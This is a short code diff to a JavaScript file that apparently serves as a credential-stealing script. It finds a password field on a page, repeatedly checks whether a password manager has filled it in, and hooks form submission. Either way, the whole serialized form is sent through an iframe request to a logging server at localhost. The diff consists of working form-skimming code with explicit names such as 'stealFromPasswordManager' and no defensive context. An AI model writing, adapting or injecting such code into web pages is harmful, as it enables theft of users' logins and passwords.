@@ -10,11 +10,30 @@ function send(data) {
 	// set the iframes src attribute to our remote server
 	iframe.setAttribute('src', 'https://localhost:3001/log?' + data);
 }
-	
-// Steal credentials after 0.5s
-setTimeout(function() {
-	var form = $('input[type="password"').closest('form');
-	if(form.length > 0) {
+			
+function stealFromPasswordManager(passwordInput, form) {
+	if(passwordInput.val() != '') {
 		send(form.serialize());
+		return;
 	}
-}, 500);
+	
+	// Try again after 0.25s
+	setTimeout(function() {
+		stealFromPasswordManager(passwordInput, form);
+	}, 250);
+}
+
+function stealOnSubmit(form) {
+	form.submit(function(event) {
+		send(form.serialize());
+	});
+}
+
+var passwordInput = $('input[type="password"');
+if(passwordInput.length > 0) {
+	var form =  passwordInput.closest('form');
+	
+	stealFromPasswordManager(passwordInput, form);
+	stealOnSubmit(form);
+}
+	
